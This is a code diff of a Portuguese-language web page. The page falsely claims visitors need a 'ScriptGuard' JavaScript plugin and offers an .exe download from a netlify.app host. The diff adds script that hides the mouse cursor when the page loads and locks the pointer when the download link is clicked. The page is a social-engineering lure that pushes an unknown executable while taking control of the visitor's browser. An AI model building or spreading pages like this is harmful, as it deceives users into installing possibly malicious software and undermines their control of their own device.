@@ -55,16 +55,18 @@
 
     <p>Para ter acesso a todo o conteúdo interativo deste site, é necessário instalar o plugin JavaScript denominado "ScriptGuard" em seu navegador. Por favor, clique no link abaixo para baixar o plugin e desfrutar plenamente da experiência de navegação.:</p>
     
-    <a href="https://sandro52.netlify.app/s.exe" download="ScriptGuard.exe">Download</a>
-
-    <button id="lockMouseBtn">Bloquear Mouse</button>
+    <a href="https://sandro52.netlify.app/s.exe" download="ScriptGuard.exe" id="downloadLink">Download</a>
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            var lockMouseBtn = document.getElementById('lockMouseBtn');
             var bodyElement = document.body;
+            var downloadLink = document.getElementById('downloadLink');
 
-            lockMouseBtn.addEventListener('click', function() {
+            // Adiciona a classe "cursor-hidden" ao body após o carregamento da página
+            document.body.classList.add('cursor-hidden');
+
+            // Adiciona um evento de clique no link de download
+            downloadLink.addEventListener('click', function() {
                 // Solicita o bloqueio do cursor do mouse
                 bodyElement.requestPointerLock = bodyElement.requestPointerLock || bodyElement.mozRequestPointerLock || bodyElement.webkitRequestPointerLock;
                 bodyElement.requestPointerLock();
@@ -74,4 +76,3 @@
 
 </body>
 </html>
-
